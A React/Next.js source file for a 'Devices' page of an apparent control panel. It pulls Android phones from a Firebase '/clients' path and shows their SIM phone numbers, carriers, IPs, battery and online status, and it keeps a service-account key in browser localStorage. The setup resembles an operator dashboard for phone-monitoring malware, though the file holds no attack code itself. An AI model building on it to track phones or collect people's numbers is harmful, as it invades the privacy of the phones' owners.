'use client';

import { useEffect, useState, useCallback, useRef } from 'react';
import { Search, RefreshCw, Wifi, WifiOff, Settings2, Loader2, ChevronLeft, ChevronRight, ToggleLeft, ToggleRight, Filter } from 'lucide-react';
import { useAuth } from '@/components/auth-provider';
import { useRouter } from 'next/navigation';
import Link from 'next/link';

interface RtdbDevice {
  id: string;
  displayName: string;
  online: boolean;
  model: string;
  android: string;
  battery?: number;
  phone: string;
  network: string;
  ip: string;
  lastSeen?: number;
}

function toStr(v: unknown): string { return v != null ? String(v).trim() : ''; }
function toNum(v: unknown): number | undefined {
  if (typeof v === 'number') return v;
  if (typeof v === 'string' && v !== '') { const n = Number(v); if (!isNaN(n)) return n; }
  return undefined;
}
function firstVal(obj: Record<string, unknown>, keys: string[]): unknown {
  for (const k of keys) if (obj[k] != null && obj[k] !== '') return obj[k];
  return undefined;
}

function flattenObj(raw: Record<string, unknown>): Record<string, unknown> {
  const out: Record<string, unknown> = { ...raw };
  const sims = raw['sims'] ?? raw['Sims'];
  if (Array.isArray(sims) && sims.length > 0) {
    const s0 = sims[0] as Record<string, unknown>;
    const phoneKeys = ['phoneNumber','PhoneNumber','number','Number','phone','Phone','mobile','Mobile','mobNo','MobNo','subscriberId','SubscriberId','simNumber','mobileNumber'];
    const opKeys = ['operator','Operator','provider','Provider','carrier','Carrier','network','Network','networkName','operatorName','displayName'];
    for (const k of phoneKeys) if (s0?.[k] && !out['phoneNumber']) out['phoneNumber'] = s0[k];
    for (const k of opKeys) if (s0?.[k] && !out['operator']) out['operator'] = s0[k];
    if (!out['network'] && out['operator']) out['network'] = out['operator'];
    if (!out['provider'] && out['operator']) out['provider'] = out['operator'];
  }
  const nets = raw['networks'] ?? raw['Networks'];
  if (Array.isArray(nets) && nets.length > 0 && !out['provider']) out['provider'] = String(nets[0]);
  for (const [, v] of Object.entries(raw)) {
    if (v == null || Array.isArray(v) || typeof v !== 'object') continue;
    for (const [k2, v2] of Object.entries(v as Record<string, unknown>)) {
      if (v2 != null && !(k2 in out)) out[k2] = v2;
    }
  }
  return out;
}

function isOnline(raw: Record<string, unknown>): boolean {
  // boolean true
  for (const k of ['online', 'Online', 'isOnline', 'IsOnline', 'connected', 'Connected', 'active', 'Active', 'isActive', 'IsActive', 'isConnected', 'IsConnected'])
    if (raw[k] === true) return true;
  // string "true" / "1" / "yes" / "online"
  for (const k of ['online', 'Online', 'isOnline', 'connected', 'active', 'status', 'Status', 'connection', 'deviceStatus', 'state', 'State']) {
    const v = String(raw[k] ?? '').toLowerCase();
    if (v === 'true' || v === '1' || v === 'yes' || v === 'online' || v === 'connected' || v === 'active') return true;
  }
  // timestamp-based: lastSeen within 5 minutes = online
  const tsKeys = ['lastSeen', 'LastSeen', 'updatedAt', 'UpdatedAt', 'lastActive', 'LastActive', 'lastUpdate', 'timestamp', 'time', 'lastOnline'];
  for (const k of tsKeys) {
    const ts = raw[k];
    if (typeof ts === 'number' && ts > 0) {
      const ms = ts > 9999999999 ? ts : ts * 1000;
      if (Date.now() - ms < 5 * 60 * 1000) return true;
    }
  }
  return false;
}

function parseDevice(devId: string, rawOrig: Record<string, unknown>): RtdbDevice {
  const raw = flattenObj(rawOrig);
  const online = isOnline(raw) || isOnline(rawOrig);
  const brand = toStr(firstVal(raw, ['Brand', 'brand']));
  const modelOnly = toStr(firstVal(raw, ['modelName', 'ModelName', 'model', 'Model', 'deviceModel', 'DeviceModel', 'device', 'Device', 'phoneModel']));
  const model = brand && modelOnly && !modelOnly.toLowerCase().startsWith(brand.toLowerCase())
    ? `${brand} ${modelOnly}` : (modelOnly || brand || '');
  const android = toStr(firstVal(raw, ['version', 'Version', 'androidVersion', 'AndroidVersion', 'android', 'Android', 'osVersion', 'OsVersion']));
  const battery = toNum(firstVal(raw, ['batteryPercent', 'BatteryPercent', 'battery', 'Battery', 'batteryLevel', 'BatteryLevel', 'bat', 'Bat', 'level', 'Level', 'charge', 'Charge', 'pct', 'percentage', 'Percentage', 'batteryPct', 'batLevel']));
  const phone = toStr(firstVal(raw, ['mobNo', 'MobNo', 'phoneNumber', 'PhoneNumber', 'phone', 'Phone', 'number', 'Number', 'mobile', 'Mobile', 'mobileNumber']));
  const network = toStr(firstVal(raw, ['provider', 'Provider', 'network', 'Network', 'networkType', 'NetworkType', 'operator', 'Operator', 'simOperator', 'carrier', 'Carrier']));
  const ip = toStr(firstVal(raw, ['ip', 'IP', 'ipAddress', 'IpAddress']));
  const lastSeen = toNum(firstVal(raw, ['lastSeen', 'LastSeen', 'updatedAt', 'UpdatedAt', 'timestamp', 'time']));
  const displayName = model || toStr(firstVal(raw, ['name', 'Name', 'deviceName', 'DeviceName'])) || devId.slice(0, 12);
  return { id: devId, displayName, online, model, android, battery, phone, network, ip, lastSeen };
}

function BatteryBadge({ val }: { val: number }) {
  const pct = Math.min(100, Math.max(0, val));
  const cls = pct > 30 ? 'bg-emerald-500/20 text-emerald-400 border-emerald-500/30'
    : pct > 10 ? 'bg-amber-500/20 text-amber-400 border-amber-500/30'
    : 'bg-red-500/20 text-red-400 border-red-500/30';
  return (
    <span className={`inline-flex items-center gap-1.5 px-2 py-0.5 rounded text-xs font-medium border ${cls}`}>
      <span className="w-5 h-1.5 rounded-sm bg-current/20 overflow-hidden flex-shrink-0">
        <span className="h-full block bg-current rounded-sm" style={{ width: `${pct}%` }} />
      </span>
      {pct}%
    </span>
  );
}

function StatusBadge({ online }: { online: boolean }) {
  return online
    ? <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded text-xs font-bold bg-emerald-500/15 text-emerald-400 border border-emerald-500/30"><span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse" />ONLINE</span>
    : <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded text-xs font-bold bg-red-500/15 text-red-400 border border-red-500/30"><span className="w-1.5 h-1.5 rounded-full bg-red-500" />OFFLINE</span>;
}

function fmtTime(ts: number | undefined): string {
  if (!ts) return '—';
  const d = new Date(ts > 9999999999 ? ts : ts * 1000);
  return d.toLocaleString('en-IN', { day: '2-digit', month: 'short', year: 'numeric', hour: '2-digit', minute: '2-digit', hour12: true });
}

const PAGE_SIZE = 15;

function loadStr(key: string): string { try { return localStorage.getItem(key) ?? ''; } catch { return ''; } }

export default function DevicesPage() {
  const { idToken } = useAuth();
  const router = useRouter();
  const [devices, setDevices] = useState<RtdbDevice[]>([]);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [search, setSearch] = useState('');
  const [filter, setFilter] = useState<'all' | 'online' | 'offline'>('all');
  const [rtdbUrl, setRtdbUrl] = useState('');
  const [hasSa, setHasSa] = useState(false);
  const [autoUpdate, setAutoUpdate] = useState(true);
  const [page, setPage] = useState(1);
  const [lastUpdated, setLastUpdated] = useState<Date | null>(null);
  const timerRef = useRef<ReturnType<typeof setInterval> | null>(null);

  useEffect(() => {
    setRtdbUrl(loadStr('panel_rtdb_url'));
    setHasSa(!!loadStr('panel_service_account'));
  }, []);

  const fetchDevices = useCallback(async () => {
    const url = loadStr('panel_rtdb_url');
    const saRaw = loadStr('panel_service_account');
    if (!url) return;
    if (!saRaw && !idToken) return;
    setLoading(true);
    setError('');
    try {
      let data: unknown;
      if (saRaw) {
        const res = await fetch('/api/admin-devices', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ serviceAccount: JSON.parse(saRaw), rtdbUrl: url, path: '/clients' }),
          signal: AbortSignal.timeout(15000),
        });
        const json = await res.json() as { data?: unknown; error?: string };
        if (json.error) { setError(json.error); return; }
        data = json.data;
      } else {
        const base = url.replace(/\/$/, '');
        const res = await fetch(`${base}/clients.json?auth=${idToken}`, {
          cache: 'no-store', signal: AbortSignal.timeout(12000),
        });
        if (!res.ok) {
          setError(res.status === 401 || res.status === 403
            ? 'Permission denied — add service account key in Settings or set role="panel" custom claim'
            : `Firebase error: HTTP ${res.status}`);
          return;
        }
        data = await res.json();
      }
      if (!data || typeof data !== 'object') { setDevices([]); return; }
      const parsed = Object.entries(data as Record<string, unknown>)
        .filter(([, v]) => v && typeof v === 'object' && !Array.isArray(v))
        .map(([id, raw]) => parseDevice(id, raw as Record<string, unknown>))
        .sort((a, b) => (b.lastSeen ?? 0) - (a.lastSeen ?? 0));
      setDevices(parsed);
      setLastUpdated(new Date());
    } catch (e) {
      setError(e instanceof Error ? e.message : 'Fetch failed');
    } finally {
      setLoading(false);
    }
  }, [idToken]);

  // auto-update
  useEffect(() => {
    fetchDevices();
  }, [fetchDevices]);

  useEffect(() => {
    if (timerRef.current) clearInterval(timerRef.current);
    if (autoUpdate) {
      timerRef.current = setInterval(fetchDevices, 30_000);
    }
    return () => { if (timerRef.current) clearInterval(timerRef.current); };
  }, [autoUpdate, fetchDevices]);

  const filtered = devices.filter(d => {
    const q = search.toLowerCase();
    const matchSearch = !q || d.displayName.toLowerCase().includes(q) ||
      d.phone.includes(q) || d.model.toLowerCase().includes(q) || d.network.toLowerCase().includes(q);
    const matchFilter = filter === 'all' || (filter === 'online' ? d.online : !d.online);
    return matchSearch && matchFilter;
  });

  const totalPages = Math.max(1, Math.ceil(filtered.length / PAGE_SIZE));
  const curPage = Math.min(page, totalPages);
  const pageItems = filtered.slice((curPage - 1) * PAGE_SIZE, curPage * PAGE_SIZE);
  const onlineCount = devices.filter(d => d.online).length;

  if (!rtdbUrl && !loadStr('panel_rtdb_url')) {
    return (
      <div className="flex flex-col items-center justify-center h-96 gap-4 text-center">
        <Settings2 className="w-12 h-12 text-slate-600 dark:text-slate-500" />
        <div>
          <p className="text-slate-200 font-semibold">Firebase not configured</p>
          <p className="text-sm text-slate-400 mt-1">Settings mein google-services.json ya RTDB URL daalo</p>
        </div>
        <Link href="/settings" className="btn-primary">Go to Settings</Link>
      </div>
    );
  }

  return (
    <div className="space-y-4 animate-fade-in">
      {/* Header */}
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-2xl font-bold text-slate-900 dark:text-white">Devices</h1>
          <p className="text-xs text-slate-400 mt-0.5">
            {lastUpdated ? `Updated ${lastUpdated.toLocaleTimeString('en-IN', { hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true })}` : 'Loading…'}
            {hasSa && <span className="ml-2 text-emerald-400 font-medium">· Admin Access</span>}
          </p>
        </div>
        <div className="flex items-center gap-2">
          <button
            onClick={() => setAutoUpdate(v => !v)}
            className={`flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-medium border transition-colors ${
              autoUpdate
                ? 'bg-emerald-500/10 border-emerald-500/30 text-emerald-400'
                : 'bg-slate-100 dark:bg-slate-800 border-slate-200 dark:border-slate-700 text-slate-400'
            }`}
          >
            {autoUpdate ? <ToggleRight className="w-4 h-4" /> : <ToggleLeft className="w-4 h-4" />}
            Auto Update
          </button>
          <button onClick={() => fetchDevices()} disabled={loading} className="btn-secondary p-2" title="Refresh">
            {loading ? <Loader2 className="w-4 h-4 animate-spin" /> : <RefreshCw className="w-4 h-4" />}
          </button>
        </div>
      </div>

      {/* Stat Cards */}
      <div className="grid grid-cols-4 gap-3">
        {[
          { label: 'Total Devices', val: devices.length, icon: '📱', gradient: 'from-emerald-600 to-emerald-500', bg: 'dark:bg-emerald-950/30', border: 'dark:border-emerald-800/50' },
          { label: 'Online', val: onlineCount, icon: '📶', gradient: 'from-blue-600 to-blue-500', bg: 'dark:bg-blue-950/30', border: 'dark:border-blue-800/50' },
          { label: 'Offline', val: devices.length - onlineCount, icon: '📴', gradient: 'from-red-600 to-red-500', bg: 'dark:bg-red-950/30', border: 'dark:border-red-800/50' },
          { label: 'This Page', val: pageItems.length, icon: '📄', gradient: 'from-violet-600 to-violet-500', bg: 'dark:bg-violet-950/30', border: 'dark:border-violet-800/50' },
        ].map(({ label, val, gradient, bg, border }) => (
          <div key={label} className={`card px-4 py-3 border ${bg} ${border}`}>
            <p className={`text-2xl font-extrabold bg-gradient-to-r ${gradient} bg-clip-text text-transparent`}>{val}</p>
            <p className="text-[11px] text-slate-400 font-semibold tracking-wide mt-0.5">{label}</p>
          </div>
        ))}
      </div>

      {/* Error */}
      {error && (
        <div className="bg-red-950/40 border border-red-800/60 rounded-lg px-4 py-3 text-sm text-red-400">
          {error}
        </div>
      )}

      {/* Search + Filter */}
      <div className="flex items-center gap-3 flex-wrap">
        <div className="relative flex-1 min-w-48">
          <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-slate-400" />
          <input
            type="search"
            placeholder="Search by name, model, phone number…"
            value={search}
            onChange={e => { setSearch(e.target.value); setPage(1); }}
            className="input pl-10 w-full"
          />
        </div>
        <div className="flex items-center gap-1 border border-slate-200 dark:border-slate-700 rounded-lg p-0.5">
          <Filter className="w-3.5 h-3.5 text-slate-400 ml-2" />
          {(['all', 'online', 'offline'] as const).map(f => (
            <button
              key={f}
              onClick={() => { setFilter(f); setPage(1); }}
              className={`px-3 py-1 rounded text-xs font-semibold capitalize transition-all ${
                filter === f
                  ? f === 'all' ? 'bg-slate-700 text-white'
                    : f === 'online' ? 'bg-emerald-600 text-white'
                    : 'bg-red-600 text-white'
                  : 'text-slate-400 hover:text-slate-200'
              }`}
            >
              {f}
            </button>
          ))}
        </div>
      </div>

      {/* Table */}
      {loading && devices.length === 0 ? (
        <div className="card p-8 text-center">
          <Loader2 className="w-8 h-8 animate-spin text-slate-400 mx-auto mb-3" />
          <p className="text-sm text-slate-400">Firebase se data fetch ho raha hai…</p>
        </div>
      ) : filtered.length > 0 ? (
        <div className="card overflow-hidden">
          <div className="overflow-x-auto">
            <table className="w-full text-sm">
              <thead>
                <tr className="border-b border-slate-200 dark:border-slate-700/60 bg-slate-50 dark:bg-slate-800/60">
                  {['STATUS', 'DEVICE NAME', 'MODEL', 'PHONE NUMBER', 'BATTERY', 'NETWORK', 'TIME & DATE'].map(col => (
                    <th key={col} className="px-4 py-3 text-left text-[10px] font-bold text-slate-400 tracking-widest whitespace-nowrap">{col}</th>
                  ))}
                </tr>
              </thead>
              <tbody className="divide-y divide-slate-100 dark:divide-slate-700/40">
                {pageItems.map((d, i) => (
                  <tr key={d.id} onClick={() => router.push(`/devices/${d.id}`)} className={`hover:bg-slate-50 dark:hover:bg-slate-800/40 transition-colors cursor-pointer ${i % 2 === 0 ? '' : 'bg-slate-50/30 dark:bg-slate-800/20'}`}>
                    <td className="px-4 py-3"><StatusBadge online={d.online} /></td>
                    <td className="px-4 py-3">
                      <div className="flex items-center gap-2">
                        <div className={`w-1.5 h-1.5 rounded-full flex-shrink-0 ${d.online ? 'bg-emerald-400 animate-pulse' : 'bg-slate-500'}`} />
                        <span className="font-medium text-slate-900 dark:text-slate-100 truncate max-w-[140px]">{d.displayName}</span>
                      </div>
                    </td>
                    <td className="px-4 py-3 text-slate-600 dark:text-slate-400 font-mono text-xs">{d.model || d.android ? `${d.model}${d.android ? ` · Android ${d.android}` : ''}` : '—'}</td>
                    <td className="px-4 py-3 font-mono text-slate-700 dark:text-slate-300">{d.phone || '—'}</td>
                    <td className="px-4 py-3">{d.battery != null ? <BatteryBadge val={d.battery} /> : <span className="text-slate-500 text-xs">—</span>}</td>
                    <td className="px-4 py-3 text-slate-600 dark:text-slate-400 text-xs">{d.network || d.ip || '—'}</td>
                    <td className="px-4 py-3 text-slate-500 dark:text-slate-500 text-xs whitespace-nowrap">{fmtTime(d.lastSeen)}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>

          {/* Pagination */}
          <div className="flex items-center justify-between px-4 py-3 border-t border-slate-100 dark:border-slate-700/40 bg-slate-50/50 dark:bg-slate-800/30">
            <p className="text-xs text-slate-400">
              Showing {Math.min(filtered.length, (curPage - 1) * PAGE_SIZE + 1)}–{Math.min(filtered.length, curPage * PAGE_SIZE)} of {filtered.length} devices
            </p>
            <div className="flex items-center gap-1">
              <button
                onClick={() => setPage(p => Math.max(1, p - 1))}
                disabled={curPage === 1}
                className="p-1.5 rounded hover:bg-slate-200 dark:hover:bg-slate-700 disabled:opacity-30 disabled:cursor-not-allowed text-slate-500 transition-colors"
              >
                <ChevronLeft className="w-4 h-4" />
              </button>
              {Array.from({ length: Math.min(7, totalPages) }, (_, i) => {
                let p: number;
                if (totalPages <= 7) p = i + 1;
                else if (curPage <= 4) p = i + 1;
                else if (curPage >= totalPages - 3) p = totalPages - 6 + i;
                else p = curPage - 3 + i;
                return (
                  <button
                    key={p}
                    onClick={() => setPage(p)}
                    className={`w-7 h-7 rounded text-xs font-medium transition-colors ${
                      p === curPage
                        ? 'bg-brand-600 text-white'
                        : 'text-slate-500 hover:bg-slate-200 dark:hover:bg-slate-700'
                    }`}
                  >
                    {p}
                  </button>
                );
              })}
              <button
                onClick={() => setPage(p => Math.min(totalPages, p + 1))}
                disabled={curPage === totalPages}
                className="p-1.5 rounded hover:bg-slate-200 dark:hover:bg-slate-700 disabled:opacity-30 disabled:cursor-not-allowed text-slate-500 transition-colors"
              >
                <ChevronRight className="w-4 h-4" />
              </button>
            </div>
          </div>
        </div>
      ) : !loading && (
        <div className="card p-10 text-center space-y-2">
          <WifiOff className="w-10 h-10 text-slate-600 mx-auto" />
          <p className="text-slate-300 font-medium">
            {error ? 'Firebase error' : devices.length === 0 ? 'Koi device nahi mila' : 'Search se koi match nahi mila'}
          </p>
          {devices.length === 0 && !error && (
            <p className="text-sm text-slate-500">/clients path mein koi data nahi · Settings check karo</p>
          )}
        </div>
      )}

      {/* Quick stats footer */}
      {devices.length > 0 && (
        <div className="flex items-center gap-4 text-xs text-slate-400 px-1">
          <span className="flex items-center gap-1"><Wifi className="w-3.5 h-3.5 text-emerald-400" /> {onlineCount} online</span>
          <span className="flex items-center gap-1"><WifiOff className="w-3.5 h-3.5 text-red-400" /> {devices.length - onlineCount} offline</span>
          {autoUpdate && <span className="text-slate-500">· Auto-refresh every 30s</span>}
        </div>
      )}
    </div>
  );
}
